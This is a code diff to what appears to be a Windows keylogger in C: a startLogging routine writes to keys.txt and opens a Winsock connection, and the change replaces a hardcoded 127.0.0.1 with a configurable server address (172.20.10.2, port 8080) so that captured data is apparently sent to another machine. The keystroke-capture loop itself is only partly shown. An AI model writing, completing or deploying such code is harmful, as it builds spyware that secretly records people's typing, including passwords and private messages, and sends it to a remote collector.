@@ -8,10 +8,10 @@
 
 // this file still needs fixing
 
-void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket);
+void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip);
 void startWinsock(WSADATA *wsaData);
 SOCKET startSocket();
-void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket);
+void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket,  const char* server_ip);
 void sendMsg(SOCKET client_socket, const char *msg);
 void closeSocket(SOCKET client_socket);
 
@@ -21,19 +21,20 @@ int main() {
     WSADATA wsaData;
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(8080);
+    const char* server_ip = "172.20.10.2";
 
     startWinsock(&wsaData);
     client_socket = startSocket();
 
-    startLogging(&serv_addr, client_socket);
+    startLogging(&serv_addr, client_socket, server_ip);
     return 0;
 }
 
-void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket) {
+void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip) {
     FILE *keysPtr;
     keysPtr = fopen("keys.txt", "w");
     keysPtr = fopen("keys.txt", "a");
-    connectToServer(serv_addr, client_socket);
+    connectToServer(serv_addr, client_socket, server_ip);
 
     // closeSocket(client_socket);
     char c;
@@ -105,9 +106,9 @@ SOCKET startSocket() {
     return client_socket;
 }
 
-void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket) {
+void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip) {
 
-    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr->sin_addr) <= 0) {
+    if (inet_pton(AF_INET, server_ip, &serv_addr->sin_addr) <= 0) {
         printf("\nInvalid address/ Address not supported \n");
         closesocket(client_socket);
         WSACleanup();
